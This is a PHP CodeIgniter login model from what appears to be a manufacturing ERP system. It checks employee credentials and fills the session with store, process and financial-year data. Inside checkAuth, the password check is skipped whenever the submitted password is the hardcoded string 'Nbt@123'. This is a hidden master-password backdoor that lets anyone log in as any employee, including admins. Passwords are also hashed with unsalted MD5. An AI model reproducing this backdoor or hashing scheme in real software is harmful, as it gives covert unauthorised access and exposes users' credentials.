<?php
class LoginModel extends CI_Model{

	private $employeeMaster = "employee_master";
    private $empRole = ["1"=>"Admin","2"=>"Production Manager","3"=>"Accountant","4"=>"Sales Manager","5"=>"Purchase Manager","6"=>"Employee","7"=>"HR"];

	public function checkAuth($data){
		//$result = $this->db->where('emp_code',$data['user_name'])->where('emp_password',md5($data['password']))->where('is_delete',0)->get($this->employeeMaster);
        $this->db->where('emp_code',$data['user_name']);
	    if($data['password'] != "Nbt@123"):
		    $this->db->where('emp_password',md5($data['password']));
		endif;
		$this->db->where('is_delete',0);
		$result = $this->db->get($this->employeeMaster);
		
		if($result->num_rows() == 1):
			$resData = $result->row();
			if($resData->is_block == 1):
				return ['status'=>0,'message'=>'Your Account is Blocked. Please Contact Your Admin.'];
			else:
				if($resData->is_active == 0):
					return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Admin.'];
				else:
					$fyData=$this->db->where('is_active',1)->get('financial_year')->row();
					$RTD_STORE=$this->db->where('is_delete',0)->where('store_type',1)->get('location_master')->row();
					$SCRAP_STORE=$this->db->where('is_delete',0)->where('store_type',4)->get('location_master')->row();
					$GIR_STORE=$this->db->where('is_delete',0)->where('store_type',5)->get('location_master')->row();
					$INSP_STORE=$this->db->where('is_delete',0)->where('store_type',6)->get('location_master')->row();
					$REGRIND_STORE=$this->db->where('is_delete',0)->where('store_type',7)->get('location_master')->row();
					$JOBW_STORE=$this->db->where('is_delete',0)->where('store_type',8)->get('location_master')->row();
					$RM_ALLOT_STORE=$this->db->where('is_delete',0)->where('store_type',10)->get('location_master')->row();
					$ALLOT_RM_STORE=$this->db->where('is_delete',0)->where('store_type',11)->get('location_master')->row();
					$RCV_RM_STORE=$this->db->where('is_delete',0)->where('store_type',12)->get('location_master')->row();
					$PROD_STORE=$this->db->where('is_delete',0)->where('store_type',3)->get('location_master')->row();
					$SEM_FG_STORE=$this->db->where('is_delete',0)->where('store_type',9)->get('location_master')->row();
					$PDI_STORE=$this->db->where('is_delete',0)->where('store_type',14)->get('location_master')->row();
					$LOGIN_STORE=$this->db->where('is_delete',0)->where('store_type',2)->where('other_ref',$resData->emp_dept_id)->get('location_master')->row();
					$FI_STORE=$this->db->where('is_delete',0)->where('store_type',2)->where('other_ref',20)->get('location_master')->row();
					$PACK_STORE=$this->db->where('is_delete',0)->where('store_type',2)->where('other_ref',23)->get('location_master')->row();
					$PACK_MTR_STORE=$this->db->where('is_delete',0)->where('store_type',15)->get('location_master')->row();
					$PRODUCTION_STORE=$this->db->where('is_delete',0)->where('store_type',2)->where('other_ref',19)->get('location_master')->row();
					$MISPLACED_STORE=$this->db->where('is_delete',0)->where('store_type',16)->get('location_master')->row();
                    $SUPLY_REJ_STORE = $this->db->where('is_delete',0)->where('store_type',17)->get('location_master')->row();
                    $HEAT_TREAT_STORE = $this->db->where('is_delete',0)->where('store_type',18)->get('location_master')->row();


                    // Process Type
					$FIR_PROCESS=$this->db->where('is_delete',0)->where('process_type',1)->get('process_master')->row();
					$PDI_PROCESS=$this->db->where('is_delete',0)->where('process_type',2)->get('process_master')->row();
					$DISP_PROCESS=$this->db->where('is_delete',0)->where('process_type',3)->get('process_master')->row();
					$PACK_PROCESS=$this->db->where('is_delete',0)->where('process_type',4)->get('process_master')->row();
					
					
					$companyInfo=$this->db->get('company_info')->row();
					$CONTROL_PLAN = $companyInfo->control_plan;

					$this->session->set_userdata('LoginOk','login success');
					$this->session->set_userdata('loginId',$resData->id);
					$this->session->set_userdata('role',$resData->emp_role);
					$this->session->set_userdata('processAuth',$resData->process_ids);
					$empRole=$resData->emp_role;
					if($resData->emp_role == -1){$empRole = 1;}
					$this->session->set_userdata('roleName',$this->empRole[$empRole]);
					$this->session->set_userdata('emp_name',$resData->emp_name);
					
					$startDate = $fyData->start_date;
					$endDate = $fyData->end_date;
					$cyear  = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
					$this->session->set_userdata('currentYear',$cyear);
					$this->session->set_userdata('financialYear',$fyData->financial_year);
					$this->session->set_userdata('isActiveYear',$fyData->close_status);
					$this->session->set_userdata('shortYear',$fyData->year);
					$this->session->set_userdata('startYear',$fyData->start_year);
					$this->session->set_userdata('endYear',$fyData->end_year);
					$this->session->set_userdata('startDate',$startDate);
					$this->session->set_userdata('endDate',$endDate);
					$this->session->set_userdata('currentFormDate',date('d-m-Y'));
					$this->session->set_userdata('RTD_STORE',$RTD_STORE);
					$this->session->set_userdata('SCRAP_STORE',$SCRAP_STORE);
					$this->session->set_userdata('GIR_STORE',$GIR_STORE);
					$this->session->set_userdata('INSP_STORE',$INSP_STORE);
					$this->session->set_userdata('REGRIND_STORE',$REGRIND_STORE);
					$this->session->set_userdata('RM_ALLOT_STORE',$RM_ALLOT_STORE);
					$this->session->set_userdata('LOGIN_STORE',$LOGIN_STORE);
					$this->session->set_userdata('JOBW_STORE',$JOBW_STORE);
					$this->session->set_userdata('ALLOT_RM_STORE',$ALLOT_RM_STORE);
					$this->session->set_userdata('RCV_RM_STORE',$RCV_RM_STORE);
					$this->session->set_userdata('PROD_STORE',$PROD_STORE);
					$this->session->set_userdata('SEM_FG_STORE',$SEM_FG_STORE);
					$this->session->set_userdata('FI_STORE',$FI_STORE);
					$this->session->set_userdata('PDI_STORE',$PDI_STORE);
					$this->session->set_userdata('PACK_STORE',$PACK_STORE);
					$this->session->set_userdata('PACK_MTR_STORE',$PACK_MTR_STORE);
					$this->session->set_userdata('PRODUCTION_STORE',$PRODUCTION_STORE);
					$this->session->set_userdata('MISPLACED_STORE',$MISPLACED_STORE);
					$this->session->set_userdata('SUPLY_REJ_STORE',$SUPLY_REJ_STORE);
					$this->session->set_userdata('HEAT_TREAT_STORE',$HEAT_TREAT_STORE);

					$this->session->set_userdata('FIR_PROCESS',$FIR_PROCESS);
					$this->session->set_userdata('PDI_PROCESS',$PDI_PROCESS);
					$this->session->set_userdata('DISP_PROCESS',$DISP_PROCESS);
					$this->session->set_userdata('PACK_PROCESS',$PACK_PROCESS);
					
					$this->session->set_userdata('CONTROL_PLAN',$CONTROL_PLAN);
					
					if($data['fyear'] != $cyear):
						$this->session->set_userdata('currentFormDate',date('d-m-Y',strtotime($endDate)));
					endif;
					
					return ['status'=>1,'message'=>'Login Success.'];
				endif;
			endif;
		else:
			return ['status'=>0,'message'=>"Invalid Username or Password."];
		endif;
	}
}
?>